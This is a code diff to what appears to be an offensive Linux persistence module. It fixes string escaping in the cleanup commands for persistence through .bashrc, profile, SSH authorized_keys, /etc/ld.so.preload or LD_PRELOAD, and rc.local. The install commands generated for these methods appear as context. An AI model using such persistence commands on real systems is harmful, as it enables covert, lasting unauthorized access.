@@ -249,7 +249,8 @@ WantedBy=timers.target
             entry = f"\n{command}\n"
 
         install_cmd = f'echo "{entry}" >> {bashrc_path}'
-        cleanup_cmd = f'sed -i "/{command.replace("/", "\\/")}/d" {bashrc_path}'
+        escaped_cmd = command.replace("/", r"\/")
+        cleanup_cmd = f'sed -i "/{escaped_cmd}/d" {bashrc_path}'
 
         return PersistenceResult(
             success=True,
@@ -276,7 +277,7 @@ WantedBy=timers.target
             method=LinuxPersistMethod.PROFILE.value,
             location=profile_path,
             install_command=f'echo "{entry}" >> {profile_path}',
-            cleanup_command=f'sed -i "/{command.replace("/", "\\/")}/d" {profile_path}',
+            cleanup_command='sed -i "/{}/d" {}'.format(command.replace("/", r"\/"), profile_path),
             content=entry,
         )
 
@@ -313,7 +314,9 @@ chmod 600 {auth_keys_path}"""
             method=LinuxPersistMethod.SSH_AUTHORIZED_KEYS.value,
             location=auth_keys_path,
             install_command=install_cmd,
-            cleanup_command=f'sed -i "/{public_key[:30].replace("/", "\\/")}/d" {auth_keys_path}',
+            cleanup_command='sed -i "/{}/d" {}'.format(
+                public_key[:30].replace("/", r"\/"), auth_keys_path
+            ),
             content=entry,
         )
 
@@ -372,7 +375,8 @@ chmod 700 {rc_path}"""
         if global_config:
             location = "/etc/ld.so.preload"
             install_cmd = f'echo "{so_path}" >> {location}'
-            cleanup_cmd = f'sed -i "/{so_path.replace("/", "\\/")}/d" {location}'
+            escaped_so = so_path.replace("/", r"\/")
+            cleanup_cmd = f'sed -i "/{escaped_so}/d" {location}'
         else:
             location = "/etc/environment"
             install_cmd = f'echo "LD_PRELOAD={so_path}" >> {location}'
@@ -477,7 +481,7 @@ echo 'exit 0' >> {rc_local_path}"""
             method=LinuxPersistMethod.RC_LOCAL.value,
             location=rc_local_path,
             install_command=install_cmd,
-            cleanup_command=f'sed -i "/{command.replace("/", "\\/")}/d" {rc_local_path}',
+            cleanup_command='sed -i "/{}/d" {}'.format(command.replace("/", r"\/"), rc_local_path),
         )
 
     # ==================== APT Hook ====================
